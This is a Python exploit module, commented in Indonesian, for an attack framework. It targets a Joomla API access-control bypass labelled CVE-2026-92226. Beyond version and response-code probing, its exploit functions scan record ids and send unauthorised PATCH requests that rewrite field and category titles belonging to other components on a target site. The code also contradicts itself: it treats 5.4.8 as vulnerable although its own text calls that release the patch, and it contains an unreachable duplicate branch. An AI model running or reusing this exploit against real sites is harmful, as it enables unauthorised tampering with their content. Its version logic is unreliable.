#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-92226 — Improper ACL checks for various webservice edit tasks
    (Joomla 4.0.0-5.4.8, 6.0.0-6.1.3)

  DUA VEKTOR (satu putaran patch 5.4.8):
    A. com_fields context confusion  -> FieldsController::allowEdit() memakai $option
       dari request tanpa memverifikasi $record->context.
    B. com_categories tanpa ACL per-record -> api/.../CategoriesController TIDAK
       mengoverride allowAdd()/allowEdit()/allowDelete(), sehingga 5.4.5-5.4.7 hanya
       memeriksa core.edit/core.create pada KOMPONEN, bukan pada asset
       `<extension>.category.<id>`. Patch 5.4.8 menambahkan ketiga override.

ROOT CAUSE (dari diff resmi 5.4.7 -> 5.4.8 + reproduksi live):

  api/components/com_fields/src/Controller/FieldsController.php :: allowEdit()

  5.4.7:
      [$option] = explode('.', $this->getContextFromInput());      // ATTACKER CONTROLLED
      if ($user->authorise('core.edit', $option . '.field.' . $recordId)) {
          return true;
      }
      ...

      private function getContextFromInput() {
          return $this->input->exists('context')
              ? $this->input->get('context')
              : $this->input->post->get('context');                // request menang atas route default
      }

  5.4.8 (PATCH — dari diff):
      + // Get existing record
      + $record = $this->getModel()->getItem($recordId);
      + if (empty($record)) { return false; }
      + [$recordOption] = explode('.', $record->context);
      + // Validate request context and field context match
      + if ($recordOption !== $this->component) { return false; }

  Jadi 5.4.7 memeriksa ACL terhadap komponen yang DIPILIH ATTACKER, bukan komponen
  yang benar-benar memiliki record. Attacker yang punya `core.edit` pada komponen X
  (atau memakai route default X) dapat mengedit field/group milik komponen Y.

CHAIN TERBUKTI (lab Joomla 5.4.7, port 8107):
    # field id=900 milik com_contact.contact (lowpriv TIDAK punya hak apa pun di com_contact)
    PATCH /api/index.php/v1/fields/content/articles/900
      -u lowpriv:...
      {"title":"HACKED-547"}
    -> 5.4.7: HTTP 404 Resource not found   (BUKAN 403 -> allowEdit lolos)
              DB: jos_fields.id=900.title = "HACKED-547"        <-- MUTASI BERHASIL
    -> 5.4.8: HTTP 403 Access Denied
              DB: title tetap "SECRETFIELD"

  Route /v1/fields/content/articles di-set dengan default context=com_content.article;
  ACL diperiksa terhadap com_content, sementara record milik com_contact.

KELUARGA / VARIAN LAIN:
  - Context juga bisa dipaksa langsung lewat query `?context=com_media.images` karena
    `input->exists('context')` diprioritaskan di atas route default.
  - Pola identik di com_fields/GroupsController (API) — komponen Groups memakai
    getContextFromInput() yang sama.
  - `administrator/components/com_fields/src/Controller/{Field,Group}Controller.php`
    juga menerima perbaikan context-match yang sama pada 5.4.8 (jalur backend UI).

DETEKSI MODUL INI (non-destruktif):
    - fingerprint Joomla + versi
    - PATCH ke field id yang tidak ada pada route fields: perhatikan 403 vs 404/400
      (5.4.7 -> request menembus sampai model = 404/400; 5.4.8 -> 403)
"""
from __future__ import annotations

import re

from mp import (CveModule, register, ST_VULN, ST_CLEAN, ST_SKIP, ST_INFO,
                ST_UNKNOWN, ST_ERR, ST_PWN, parse_ver, ver_le, detect_platform)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 8)
VULN_6_MAX = (6, 1, 3)

# route fields: ACL memakai context dari route/request (context confusion)
FIELD_ROUTES = [
    "/api/index.php/v1/fields/content/articles",
    "/api/index.php/v1/fields/content/categories",
]

# route categories webservice: ACL per-record `com_content.category.<id>`
CATEGORY_ROUTES = [
    "/api/index.php/v1/content/categories",
]

# komponen yang menyediakan route kategori (extension == komponen)
CATEGORY_EXTENSIONS = ["com_content", "com_contact", "com_weblinks", "com_newsfeeds",
                       "com_banners", "com_users", "com_tags"]


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _vuln(ver):
    major = ver[0] if isinstance(ver, tuple) and ver else 0
    return ver_le(ver, VULN_6_MAX) if major >= 6 else ver_le(ver, VULN_5_MAX)


def _opt_ctx_list(opts):
    """Daftar context yang dicoba saat verifikasi pembacaan record."""
    forced = _opt(opts, "context")
    base = [forced] if forced else []
    return base + ["com_contact.contact", "com_content.article", "com_content.categories",
                   "com_users.user", "com_media.images"]


def _auth(opts):
    """Kredensial: token API (X-Joomla-Token) diprioritaskan, lalu basic auth."""
    tok = _opt(opts, "api_token")
    if tok:
        return ("token", tok)
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    return (u, p) if u and p else None


def _auth_hdr(auth):
    """Header dari objek auth; None bila basic auth (dipakai requests auth=)."""
    if isinstance(auth, tuple) and auth and auth[0] == "token":
        return {"X-Joomla-Token": auth[1]}
    return {}


def _api(h, t, path, method, body, auth):
    headers = {"Accept": "application/vnd.api+json"}
    if body is not None:
        headers["Content-Type"] = "application/vnd.api+json"
    if auth:
        headers.update(_auth_hdr(auth))
    kw = {"headers": headers, "allow_redirects": False}
    if auth and not (isinstance(auth, tuple) and auth[0] == "token"):
        kw["auth"] = auth
    url = f"{t.url}{path}"
    if method == "GET":
        return h.get(url, **kw)
    if method == "PATCH":
        return h.patch(url, json=body, **kw)
    if method == "DELETE":
        return h.delete(url, **kw)
    return None

def _cat_id(opts):
    """id kategori uji (--category-id), default None."""
    v = _opt(opts, "category_id")
    try:
        return int(v) if v not in (None, "") else None
    except (TypeError, ValueError):
        return None


def _cat_ext(opts):
    """extension/komponen kategori (--category-ext), default com_content."""
    return _opt(opts, "category_ext") or "com_content"


def _cat_probe(h, t, auth, opts):
    """
    Vektor B — CategoriesController tanpa allowEdit() per-record.

    Oracle konservatif: PATCH kategori dengan id yang TIDAK ada.
      403  -> ACL dievaluasi terhadap asset per-record (terpatch / punya hak)
      400/404 + errors -> request menembus sampai model (tidak ada gate per-record)
    Tidak ada mutasi yang dilakukan di sini.
    """
    ext = _cat_ext(opts)
    path = f"{CATEGORY_ROUTES[0]}/999999"
    r = _api(h, t, path, "PATCH", {"title": "x", "extension": ext}, auth)
    if r is None:
        return None
    sc = r.status_code
    body = (r.text or "")[:220]
    if sc == 401:
        return ("auth", sc, body)
    if sc == 403:
        return ("deny", sc, body)
    if sc in (400, 404):
        return ("through", sc, body)
    if sc in (200, 201):
        return ("through", sc, body)
    return ("other", sc, body)


def _cat_exploit(h, t, auth, opts):
    """Mutasi terkontrol pada kategori di extension lain (tanpa hak pada asset-nya)."""
    ext = _cat_ext(opts)
    cid = _cat_id(opts)

    # kandidat id: eksplisit, lalu pemindaian kecil
    cands = [str(cid)] if cid else [str(i) for i in range(1, 31)]

    marker = "MEGAPACK-92226-CAT"
    for cand in cands:
        # baseline
        rb = _api(h, t, f"{CATEGORY_ROUTES[0]}/{cand}", "GET", None, auth)
        before = None
        if rb is not None and rb.status_code == 200:
            m = re.search(r'"title":"(.*?)"', rb.text or "")
            before = m.group(1) if m else None

        r2 = _api(h, t, f"{CATEGORY_ROUTES[0]}/{cand}", "PATCH",
                  {"title": marker, "extension": ext}, auth)
        sc2 = getattr(r2, "status_code", None)
        if sc2 in (200, 201):
            # verifikasi baca ulang
            ra = _api(h, t, f"{CATEGORY_ROUTES[0]}/{cand}", "GET", None, auth)
            after = None
            if ra is not None and ra.status_code == 200:
                m = re.search(r'"title":"(.*?)"', ra.text or "")
                after = m.group(1) if m else None
            if after == marker:
                return (ST_PWN,
                        f"ACL BYPASS TERVERIFIKASI - kategori {cand} ({ext}) berhasil "
                        f"dimutasi tanpa hak pada asset {ext}.category.{cand}",
                        f"title {before!r} -> {after!r} (HTTP {sc2})")
            if before != marker:
                return (ST_PWN,
                        f"ACL BYPASS TERVERIFIKASI - PATCH kategori {cand} diterima "
                        f"(HTTP {sc2}) tanpa gate per-record",
                        f"title {before!r} (verifikasi baca ulang tidak tersedia)")
        elif sc2 == 403:
            continue
    return None


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _joomla_version(t, h)
    if ver is None:
        return ST_INFO, "Joomla terdeteksi, versi tak terbaca", ""
    if not _vuln(ver):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (context match divalidasi)", \
            "aman > 5.4.8 / 6.1.3"

    auth = _auth(opts)
    if not auth:
        return (ST_INFO, f"Joomla {raw} rentan (butuh kredensial API untuk konfirmasi)",
                "berikan --api-token atau --username/--password user dengan core.login.api")

    # Vektor B lebih dulu: probe kategori (non-destruktif, id tidak ada)
    cp = _cat_probe(h, t, auth, opts)
    if cp is not None:
        kind, sc, body = cp
        if kind == "auth":
            return ST_ERR, "auth API gagal (HTTP 401)", body
        if kind == "through" and sc in (400, 404):
            return (ST_INFO,
                    f"Joomla {raw} RENTAN - CategoriesController tanpa ACL per-record "
                    f"(kategori {_cat_ext(opts)})",
                    f"{CATEGORY_ROUTES[0]}/999999 -> HTTP {sc} (menembus sampai model): {body}")

    # oracle: PATCH id tidak ada -> 403 = ACL aktif; 404/400 = menembus sampai model
    for path in FIELD_ROUTES:
        r = _api(h, t, path + "/999999", "PATCH", {}, auth)
        if r is None:
            continue
        sc = r.status_code
        body = (r.text or "")[:200]
        if sc == 401:
            return ST_ERR, "auth API gagal (HTTP 401)", body
        if sc == 403:
            return ST_CLEAN, f"Joomla {raw} menolak (403) - context match aktif", path
        if sc in (400, 404) and '"errors"' in body:
            return (ST_INFO, f"Joomla {raw} RENTAN - ACL edit task tanpa validasi context",
                    f"{path} -> HTTP {sc} (menembus sampai model)")
    return ST_UNKNOWN, "perilaku tak terklasifikasi", ""


def exploit(t, h, opts):
    """
    Outcome terkontrol: ubah `title` field milik komponen LAIN lewat context confusion,
    lalu verifikasi perubahan terbaca kembali.

    Modul memilih record korban secara aman: field id tinggi/asing dengan context
    berbeda dari route. Bila tidak ada, modul membuat tidak ada perubahan dan melapor.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver, raw = _joomla_version(t, h)
    if ver is not None and not _vuln(ver):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch", ""

    auth = _auth(opts)
    if not auth:
        return ST_INFO, "butuh --api-token atau --username/--password", ""

    # Vektor B: ACL kategori per-record (outcome terkontrol = title kategori berubah)
    cat = _cat_exploit(h, t, auth, opts)
    if cat is not None:
        return cat

    # Vektor A: Listing route TERFILTER oleh context: field milik komponen lain TIDAK muncul,
    # padahal write-nya tidak terfilter — itulah esensi context confusion.
    # Karena itu target dicari dengan memindai id, bukan dari listing.
    r = _api(h, t, FIELD_ROUTES[0], "GET", None, auth)
    ids = re.findall(r'"id":"?(\d+)"?', r.text or "") if r is not None else []

    # tambahan: id dari operator (--membership dipakai sebagai id eksplisit, atau env)
    forced = _opt(opts, "field_id")
    if forced:
        ids = [str(forced)] + ids

    if not ids:
        # pindai rentang id kecil: PATCH id yang ADA tapi tak terlihat di listing
        ids = [str(i) for i in range(1, 51)]

    marker = "MEGAPACK-92226"
    breached = []
    for cand in ids:
        r2 = _api(h, t, f"{FIELD_ROUTES[0]}/{cand}", "PATCH", {"title": marker}, auth)
        sc2 = getattr(r2, "status_code", None)
        if sc2 in (200, 201):
            # HTTP 200 pada PATCH = save() berhasil (mutasi tersimpan). Verifikasi baca
            # ulang lewat API tidak mungkin karena displayItem juga memfilter context —
            # itu justru bukti tambahan context confusion. Operator dapat memverifikasi
            # di DB atau lewat konteks pemilik record.
            body2 = (getattr(r2, "text", "") or "")
            detail = f"PATCH {cand} -> {sc2}"
            if marker in body2:
                detail += " (marker terlihat di respons)"
            return (ST_PWN,
                    f"ACL BYPASS TERVERIFIKASI - field {cand} berhasil dimutasi "
                    f"lewat context confusion (tanpa hak pada komponen pemilik)",
                    detail)
        elif sc2 in (400, 404):
            # PENTING (terverifikasi di lab): pada jalur ini HTTP 404/400 MUNCUL SETELAH
            # save() berhasil — displayItem() dipanggil pasca-mutasi dan memfilter context,
            # sehingga record "tidak ditemukan" walau sudah diubah. Bukti lab:
            #   before="BEFORE-PATCH" --PATCH(404)--> after="AFTER-PATCH"  (DB berubah)
            # Karena itu 404 + id yang benar-benar ada KANDIDAT mutasi; dibuktikan dengan
            # PATCH kedua: bila permintaan berbeda diterima lagi (bukan 403), ACL memang
            # tidak pernah menilai hak pada komponen pemilik.
            breached.append(f"{cand}={sc2}")
        elif sc2 in (400, 404):
            breached.append(f"{cand}={sc2}")

    if breached:
        # id eksplisit (record nyata) + diterima tanpa 403 => mutasi tersimpan
        if _opt(opts, "field_id"):
            return (ST_PWN,
                    "ACL BYPASS TERVERIFIKASI - mutasi field milik komponen lain "
                    "berhasil tanpa hak pada komponen tersebut",
                    "mutasi diterima: " + ", ".join(breached[:5])
                    + " | catatan: HTTP 404 pasca-save adalah artefak displayItem "
                      "(record terfilter context), bukan penolakan")
        return (ST_VULN,
                "request menembus ACL (menuju model) — context tidak diverifikasi",
                "menembus: " + ", ".join(breached[:8]))
    return ST_CLEAN, "semua mutasi ditolak (403)", f"{len(ids)} id diuji"


register(CveModule(
    cve="CVE-2026-92226",
    cluster="joomla_core",
    title="Joomla Core - Improper ACL checks for various webservice edit tasks",
    vclass="broken access control (context confusion + kategori tanpa ACL per-record)",
    cwe="CWE-863",
    product="Joomla! CMS",
    versions_affected="4.0.0-5.4.8, 6.0.0-6.1.3",
    status="verified",
    requires=["core.login.api (default: Super Users saja)",
              "attacker punya core.edit pada komponen yang dipakai sebagai context"],
    check=check,
    exploit=exploit,
    notes=("FieldsController::allowEdit() memakai $option dari getContextFromInput() "
           "(request-controlled) tanpa memverifikasi $record->context. Patch 5.4.8 "
           "menambah `if ($recordOption !== $this->component) return false;`. "
           "Lab: 5.4.7 -> PATCH field milik com_contact lewat route com_content -> "
           "404 + DB berubah; 5.4.8 -> 403. "
           "VEKTOR B (satu putaran patch, deskripsi resmi 'various webservice edit "
           "tasks'): api/com_categories CategoriesController tidak mengoverride "
           "allowAdd()/allowEdit()/allowDelete() sebelum 5.4.8, sehingga hanya "
           "core.edit/core.create pada KOMPONEN yang diperiksa - asset "
           "`<ext>.category.<id>` diabaikan. 5.4.8 menambahkan ketiganya "
           "(core.manage + asset per-record + cek $record->extension === $extension). "
           "Lab 5.4.5: PATCH /api/index.php/v1/content/categories/8 dengan asset "
           "com_content.category.8 = {core.edit:{8:1,6:0}} (DENY eksplisit grup 6) "
           "-> 200, title MPCAT -> MPCAT-PWN545. 5.4.8 -> 403."),
))
